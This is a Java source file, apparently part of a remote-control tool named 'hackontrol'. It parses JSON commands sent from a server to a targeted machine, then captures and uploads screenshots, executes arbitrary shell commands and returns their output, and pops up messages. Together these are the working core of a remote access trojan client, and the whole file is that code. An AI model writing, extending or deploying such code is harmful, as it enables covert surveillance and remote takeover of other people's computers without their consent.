package com.khopan.hackontrol.network;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;

import javax.imageio.ImageIO;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.khopan.hackontrol.CommandPrompt;
import com.khopan.hackontrol.MachineId;
import com.khopan.hackontrol.message.MessageDisplay;

public class Response {
	private final Request request;
	private final MachineId identifier;
	private final ObjectMapper mapper;

	public Response(Request request, MachineId identifier) {
		this.request = request;
		this.identifier = identifier;
		this.mapper = new ObjectMapper();
	}

	public void parse(String response) {
		if(response == null) {
			return;
		}

		JsonNode node;

		try {
			node = this.mapper.readTree(response);
		} catch(Throwable ignored) {
			return;
		}

		if(!(node instanceof ObjectNode)) {
			return;
		}

		ObjectNode objectNode = (ObjectNode) node;

		if(!objectNode.has("requestMode")) {
			return;
		}

		int mode = objectNode.get("requestMode").asInt(-1);

		if(mode < 0) {
			return;
		}

		MachineId identifier = null;

		if(objectNode.has("machineId")) {
			String identifierText = objectNode.get("machineId").asText();

			if(!identifierText.isEmpty()) {
				identifier = new MachineId(identifierText);
			}
		}

		if(identifier != null && !identifier.getIdentifier().equals(this.identifier.getIdentifier())) {
			return;
		}

		switch(mode) {
		case ResponseMode.STATUS_QUERY:
			this.request.statusReport(true);
			break;
		case ResponseMode.TAKE_SCREENSHOT: {
			Robot robot;

			try {
				robot = new Robot();
			} catch(Throwable ignored) {
				return;
			}

			BufferedImage image = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			ByteArrayOutputStream stream = new ByteArrayOutputStream();

			try {
				ImageIO.write(image, "png", stream);
			} catch(Throwable ignored) {
				return;
			}

			this.request.screenshotTaken(stream.toByteArray());
			break;
		}
		case ResponseMode.EXECUTE_COMMAND: {
			if(!objectNode.has("command")) {
				return;
			}

			String command = objectNode.get("command").asText();

			if(command.isEmpty()) {
				return;
			}

			new Thread(() -> {
				String result = CommandPrompt.execute(command);
				this.request.commandResult(result);
			}).start();

			break;
		}
		case ResponseMode.SHOW_MESSAGE:
			if(!objectNode.has("message")) {
				return;
			}

			String message = objectNode.get("message").asText();

			if(message.isEmpty()) {
				return;
			}

			MessageDisplay.display(message);
			break;
		}
	}
}
